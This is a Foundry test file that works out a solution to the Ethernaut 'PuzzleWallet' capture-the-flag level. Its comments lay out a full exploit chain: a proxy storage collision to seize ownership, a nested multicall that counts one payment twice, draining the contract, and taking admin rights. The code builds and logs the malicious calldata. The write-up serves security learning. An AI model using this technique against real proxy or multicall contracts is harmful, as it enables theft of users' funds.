// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

// foundry cannot recognise proxy address inserted in the implementation
contract PuzzleWalletTest is Test {
    PuzzleWallet instance;
    PuzzleProxy proxy;
    address alice = makeAddr("alice");

    function test() public {
        // 1. proposeNewAdmin() to become the owner
        // 2. addToWhitelist() since it's the owner

        // 3. multicall() with deposit() and innerMulticall(), which includes another deposit(),
        //    to reenter multicall() to avoid depositCalled restriction
        //    since there's two deposit() here, can append msg.value the same as the current balance 0.001,
        //    s.t. balances[msg.sender] = 0.002
        bytes memory depositData = abi.encodeWithSelector(
            PuzzleWallet.deposit.selector
        );

        bytes[] memory nestedData = new bytes[](1);
        nestedData[0] = depositData;

        bytes memory innerMulticallData = abi.encodeWithSelector(
            bytes4(keccak256("multicall(bytes[])")),
            nestedData
        );

        bytes[] memory outerMulticallData = new bytes[](2);
        outerMulticallData[0] = depositData;
        outerMulticallData[1] = innerMulticallData;

        // [0xd0e30db0,0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000]
        console.logBytes(outerMulticallData[0]);
        console.logBytes(outerMulticallData[1]);

        // 4. execute() with the total value of the address balance 0.002 can drain this contract

        // 5. setMaxBalance() with the casting from the address to become admin()
        console.logUint(uint256(uint160(vm.envAddress("MY_ADDRESS"))));
    }
}
